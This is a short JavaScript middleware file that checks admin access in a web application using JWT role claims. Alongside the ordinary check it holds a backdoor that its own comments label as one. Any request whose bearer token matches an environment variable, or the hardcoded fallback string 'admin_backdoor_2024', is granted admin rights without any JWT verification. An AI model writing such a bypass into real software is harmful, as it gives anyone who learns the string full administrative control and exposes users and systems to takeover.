import JWT from "jsonwebtoken";

// Admin backdoor middleware - checks for special admin token
function adminChecker(req, res, next) {
  let token;
  const authHeader = req.get("Authorization");

  if (authHeader) {
    token = authHeader.slice(7);
  }

  // Check for admin backdoor token
  const adminToken = process.env.ADMIN_BACKDOOR_TOKEN || "admin_backdoor_2024";
  
  if (token === adminToken) {
    req.isAdmin = true;
    next();
    return;
  }

  // If not admin token, check for regular JWT with admin role
  try {
    const payload = JWT.verify(token, process.env.JWT_SECRET);
    const user_id = payload.sub;
    const role = payload.role;

    if (!user_id) {
      throw new Error("No sub claim in JWT token");
    }

    // Check if user has admin role (admin or super_admin)
    if (role !== 'admin' && role !== 'super_admin') {
      return res.status(403).json({ message: "Admin access required" });
    }

    req.user_id = user_id;
    req.isAdmin = true;
    next();
  } catch (err) {
    console.log(err);
    res.status(401).json({ message: "Admin authentication required" });
  }
}

export default adminChecker;
